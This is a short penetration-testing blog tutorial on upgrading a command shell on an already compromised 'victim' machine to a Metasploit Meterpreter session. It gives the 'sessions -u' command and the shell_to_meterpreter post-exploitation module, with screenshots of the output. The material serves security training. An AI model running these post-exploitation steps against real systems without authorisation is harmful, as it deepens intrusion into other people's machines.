<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">How to Upgrade Command Shell to Meterpreter</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/command-shell-to-meterpreter/" rel="bookmark"><time class="entry-date published updated" datetime="2017-03-18T18:54:15+00:00">March 18, 2017</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">In network penetration testing, we always wish to hack a system of an internal network and try to make unauthorized access through a meterpreter session using the Metasploit framework.  But there are some exploits which will directly provide victim’s command shell instead of meterpreter session. In this article, we have tried to upgrade from the victim’s shell to a meterpreter shell.</span></p>
<p><span style="color: #000000;">Now once we have access to victims command shell then follow the steps given below to upgrade a command shell into the meterpreter shell.</span></p>
<p><span style="color: #000000;">Here I already have access to command shell of victim’s PC</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-_0_WrbJsFEs/XfstYQvqvMI/AAAAAAAAiAY/qAwyeVUG9TQ16vxkm8PVl7g3-WXfQwhqgCLcBGAsYHQ/s1600/1.png"/></span></p>
<p><span style="color: #000000;">So now we can use “-u” (option) with the session ID for upgrading our shell into meterpreter session. Execute the following command for session manipulation.</span></p>
<pre class="lang:default decode:true">sessions -u 1</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8EqbBJ5dvSo/XfstYVjSlUI/AAAAAAAAiAU/hMtKrIjn228Q-rB1oStOq0adAKUGgzAhwCLcBGAsYHQ/s1600/2.png"/></span></p>
<h3><span style="color: #800000;"><strong>Other Way</strong></span></h3>
<p><span style="color: #000000;">This module attempts to upgrade a command shell to meterpreter. The shell platform is automatically detected and the best version of meterpreter for the target is selected.</span></p>
<pre class="lang:default decode:true  ">use post/multi/manage/shell_to_meterpreter
msf post(shell_to_meterpreter) &gt; set session 1
msf post(shell_to_meterpreter) &gt; exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-aBCUUYWewzQ/XfstYSoOR7I/AAAAAAAAiAQ/TDG3Moc8IrgLXhsJDLfmUlNLaxauoKLNgCLcBGAsYHQ/s1600/3.png"/></span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Pinky Deka is trained in Certified Ethical hacking and Bug Bounty Hunter. Connect with her <a class="broken_link" style="color: #000000;" href="https://www.linkedin.com/in/pinky-deka/"><strong>here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
